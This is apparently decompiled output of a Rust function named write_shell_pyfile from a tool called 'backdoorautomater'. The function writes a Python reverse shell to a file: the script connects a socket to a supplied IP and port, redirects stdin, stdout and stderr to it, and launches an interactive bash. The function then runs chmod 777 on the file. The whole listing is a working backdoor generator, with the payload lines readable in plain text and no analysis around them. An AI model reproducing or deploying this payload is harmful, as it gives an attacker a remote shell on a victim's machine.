long _ZN17backdoorautomater11shellscript18write_shell_pyfile17h0bdea7fe03ab2920E
               (long param_1,long param_2,long param_3)

{
  long lVar1;
  undefined8 uVar2;
  int local_1ec;
  undefined4 local_1e8;
  undefined4 uStack_1e4;
  undefined4 uStack_1e0;
  undefined4 uStack_1dc;
  undefined8 local_1d8;
  undefined4 local_1c8;
  undefined4 uStack_1c4;
  undefined4 uStack_1c0;
  undefined4 uStack_1bc;
  undefined8 local_1b8;
  undefined4 local_1a8;
  undefined4 uStack_1a4;
  undefined4 uStack_1a0;
  undefined4 uStack_19c;
  undefined8 local_198;
  undefined4 local_168;
  undefined4 uStack_164;
  undefined4 uStack_160;
  undefined4 uStack_15c;
  undefined8 local_158;
  undefined4 local_148;
  undefined4 uStack_144;
  undefined4 uStack_140;
  undefined4 uStack_13c;
  undefined8 local_138;
  undefined8 local_130;
  undefined8 uStack_128;
  undefined4 local_120;
  undefined4 uStack_11c;
  undefined4 uStack_118;
  undefined4 uStack_114;
  undefined local_60 [32];
  undefined8 local_40;
  undefined8 local_38;
  
                    /* try { // try from 0015f238 to 0015f247 has its CatchHandler @ 0015f715 */
  _ZN3std2fs4File6create17he97042899d0016f9E(&local_130,param_3);
  lVar1 = uStack_128;
  if ((int)local_130 == 0) {
    local_1ec = local_130._4_4_;
                    /* try { // try from 0015f26a to 0015f2f4 has its CatchHandler @ 0015f6fd */
    lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                      (&local_1ec,"import socket,subprocess,os;\n",0x1d);
    if ((lVar1 == 0) &&
       (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                          (&local_1ec,"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n",0x34),
       lVar1 == 0)) {
      local_120 = *(undefined4 *)(param_2 + 8);
      uStack_11c = *(undefined4 *)(param_2 + 0xc);
      uStack_118 = *(undefined4 *)(param_2 + 0x10);
      uStack_114 = *(undefined4 *)(param_2 + 0x14);
      local_130 = "v_ip=\'";
      uStack_128 = 6;
      _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_1a8,&local_130,2,1,0);
      local_1d8 = local_198;
      local_1e8 = local_1a8;
      uStack_1e4 = uStack_1a4;
      uStack_1e0 = uStack_1a0;
      uStack_1dc = uStack_19c;
                    /* try { // try from 0015f309 to 0015f384 has its CatchHandler @ 0015f6ee */
      _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E(&local_1e8,"\';\n",3);
      lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                        (&local_1ec,CONCAT44(uStack_1dc,uStack_1e0),local_1d8);
      if (lVar1 == 0) {
        local_120 = *(undefined4 *)(param_1 + 8);
        uStack_11c = *(undefined4 *)(param_1 + 0xc);
        uStack_118 = *(undefined4 *)(param_1 + 0x10);
        uStack_114 = *(undefined4 *)(param_1 + 0x14);
        local_130 = "s.connect((v_ip,";
        uStack_128 = 0x10;
        _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_1a8,&local_130,2,1,0);
        local_1b8 = local_198;
        local_1c8 = local_1a8;
        uStack_1c4 = uStack_1a4;
        uStack_1c0 = uStack_1a0;
        uStack_1bc = uStack_19c;
                    /* try { // try from 0015f399 to 0015f47e has its CatchHandler @ 0015f6df */
        _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                  (&local_1c8,&DAT_00265a9f,4);
        lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                          (&local_1ec,CONCAT44(uStack_1bc,uStack_1c0),local_1b8);
        if ((((lVar1 == 0) &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_1ec,"os.dup2(s.fileno(),0);\n",0x17), lVar1 == 0)) &&
            (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                               (&local_1ec,"os.dup2(s.fileno(),1);\n",0x17), lVar1 == 0)) &&
           (((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_1ec,"os.dup2(s.fileno(),2);\n",0x17), lVar1 == 0 &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_1ec,"v_shell_path=\'/usr/bin/bash\';\n",0x1e), lVar1 == 0))
            && ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                   (&local_1ec,"v_shell_value=\'-i\';\n",0x14), lVar1 == 0 &&
                (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                   (&local_1ec,"p=subprocess.call([v_shell_path,v_shell_value]);\n",
                                    0x31), lVar1 == 0)))))) {
          local_120 = *(undefined4 *)(param_3 + 8);
          uStack_11c = *(undefined4 *)(param_3 + 0xc);
          uStack_118 = *(undefined4 *)(param_3 + 0x10);
          uStack_114 = *(undefined4 *)(param_3 + 0x14);
          local_130 = "chmod 777 ";
          uStack_128 = 10;
                    /* try { // try from 0015f4f7 to 0015f515 has its CatchHandler @ 0015f6df */
          _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_1a8,&local_130,2,1,0);
          local_158 = local_198;
          local_168 = local_1a8;
          uStack_164 = uStack_1a4;
          uStack_160 = uStack_1a0;
          uStack_15c = uStack_19c;
                    /* try { // try from 0015f530 to 0015f548 has its CatchHandler @ 0015f683 */
          _ZN3std7process7Command3new17hc59b10cf3f1b2adaE(&local_130,"sh",2);
                    /* try { // try from 0015f54c to 0015f5b8 has its CatchHandler @ 0015f6bb */
          uVar2 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(&local_130,"-c",2);
          local_198 = local_158;
          local_1a8 = local_168;
          uStack_1a4 = uStack_164;
          uStack_1a0 = uStack_160;
          uStack_19c = uStack_15c;
          uVar2 = _ZN3std7process7Command3arg17hc1c88ee68029addcE(uVar2,&local_1a8);
          (*(code *)PTR__ZN3std7process7Command6output17hf2f7777b705db8a9E_00368e98)
                    (&local_1a8,uVar2);
          _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4dac3b1149b99667E
                    (local_60,&local_1a8,&PTR_s_src_shellscript_rs_0032a818);
                    /* try { // try from 0015f5b9 to 0015f5e0 has its CatchHandler @ 0015f6a9 */
          _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h60da061aa1df0d14E(&local_130);
          (*(code *)PTR__ZN5alloc6string6String15from_utf8_lossy17h7ed9087fa43d10adE_00368300)
                    (&local_1a8,local_40,local_38);
                    /* try { // try from 0015f5e1 to 0015f5fa has its CatchHandler @ 0015f69a */
          uVar2 = _ZN71__LT_alloc__borrow__Cow_LT_B_GT__u20_as_u20_core__ops__deref__Deref_GT_5deref17ha2c16a4b1cc76445E
                            (&local_1a8);
          _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
                    (&local_130,uVar2);
          local_138 = CONCAT44(uStack_11c,local_120);
          local_148 = (int)local_130;
          uStack_144 = local_130._4_4_;
          uStack_140 = (undefined4)uStack_128;
          uStack_13c = uStack_128._4_4_;
                    /* try { // try from 0015f61b to 0015f631 has its CatchHandler @ 0015f688 */
          _ZN4core3ptr50drop_in_place_LT_alloc__borrow__Cow_LT_str_GT__GT_17hb5385058f177b775E
                    (&local_1a8);
          _ZN17backdoorautomater9sanitizer23sanitize_system_command17hc9c6071c8b9b108cE(&local_148);
                    /* try { // try from 0015f632 to 0015f63e has its CatchHandler @ 0015f6a9 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_148);
                    /* try { // try from 0015f63f to 0015f64b has its CatchHandler @ 0015f681 */
          _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(local_60);
                    /* try { // try from 0015f64c to 0015f655 has its CatchHandler @ 0015f6ee */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1c8);
                    /* try { // try from 0015f656 to 0015f65f has its CatchHandler @ 0015f6fd */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1e8);
                    /* try { // try from 0015f664 to 0015f668 has its CatchHandler @ 0015f715 */
          _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_1ec);
                    /* try { // try from 0015f669 to 0015f670 has its CatchHandler @ 0015f710 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_3);
                    /* try { // try from 0015f671 to 0015f678 has its CatchHandler @ 0015f70b */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
          lVar1 = 0;
          goto LAB_0015f4b4;
        }
                    /* try { // try from 0015f487 to 0015f490 has its CatchHandler @ 0015f6ee */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1c8);
      }
                    /* try { // try from 0015f491 to 0015f49a has its CatchHandler @ 0015f6fd */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1e8);
    }
                    /* try { // try from 0015f49f to 0015f4a3 has its CatchHandler @ 0015f715 */
    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_1ec);
  }
                    /* try { // try from 0015f4a4 to 0015f4ab has its CatchHandler @ 0015f710 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_3);
                    /* try { // try from 0015f4ac to 0015f4b3 has its CatchHandler @ 0015f70b */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
LAB_0015f4b4:
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_1);
  return lVar1;
}